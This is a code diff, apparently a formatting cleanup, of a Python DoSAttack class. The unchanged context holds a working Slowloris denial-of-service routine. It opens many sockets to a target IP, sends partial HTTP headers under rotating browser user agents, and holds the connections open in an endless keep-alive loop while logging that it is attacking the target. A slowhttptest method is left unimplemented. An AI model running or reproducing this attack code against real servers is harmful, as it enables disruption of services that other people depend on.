@@ -2,11 +2,9 @@ import torch
 import torch.nn as nn
 import socket
 import threading
-import time
 import random
 from random_string_generator import RandomStringGenerator
 import logging
-import sys
 
 
 logging.basicConfig(
@@ -15,7 +13,9 @@ logging.basicConfig(
 
 
 class DoSAttack:
-    def __init__(self, target_ip, num_connections, attack_type="Slowloris", target_port=80):
+    def __init__(
+        self, target_ip, num_connections, attack_type="Slowloris", target_port=80
+    ):
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_connections = num_connections
@@ -50,44 +50,107 @@ class DoSAttack:
             sock.close()
         except Exception as e:
             logging.error(f"Exception occurred while creating a connection: {e}")
-            
+
     def send_line(self, s, line):
         line = f"{line}\r\n"
         s.send(line.encode("utf-8"))
 
     def send_header(self, s, name, value):
         self.send_line(s, f"{name}: {value}")
-            
+
     def slowloris_attack(self):
         user_agents = [
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36"
+                " (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36"
+                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50"
+                " (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101"
+                " Firefox/49.0"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36"
+                " (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36"
+                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36"
+                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14"
+                " (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
+            ),
+            (
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50"
+                " (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
+                " like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
+                " like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
+                " like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
+                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
+                " Gecko) Chrome/54.0.2840.71 Safari/537.36"
+            ),
             "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+            (
+                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,"
+                " like Gecko) Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,"
+                " like Gecko) Chrome/54.0.2840.71 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
+                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
+                " Gecko) Chrome/54.0.2840.71 Safari/537.36"
+            ),
             "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
             "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
             "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+            (
+                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like"
+                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
+                " Chrome/53.0.2785.143 Safari/537.36"
+            ),
+            (
+                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101"
+                " Firefox/49.0"
+            ),
         ]
         list_of_sockets = []
-        
+
         def init_socket(ip: str):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
@@ -98,7 +161,6 @@ class DoSAttack:
             self.send_header(s, "Accept-language", "en-US,en,q=0.5")
             return s
 
-        
         def slowloris_iteration():
             logging.info("Sending keep-alive headers...")
             logging.info("Socket count: %s", len(list_of_sockets))
@@ -127,8 +189,7 @@ class DoSAttack:
                 except socket.error as e:
                     logging.debug("Failed to create new socket: %s", e)
                     break
-        
-        
+
         ip = self.target_ip
         socket_count = self.num_connections
         logging.info("Attacking %s with %s sockets.", ip, socket_count)
@@ -140,7 +201,7 @@ class DoSAttack:
                 logging.debug(e)
                 break
             list_of_sockets.append(s)
-        
+
         while True:
             try:
                 slowloris_iteration()
@@ -149,7 +210,7 @@ class DoSAttack:
                 break
             except Exception as e:
                 logging.debug("Error in Slowloris iteration: %s", e)
-        
+
     def slowhttptest_attack(self):
         raise NotImplementedError
 
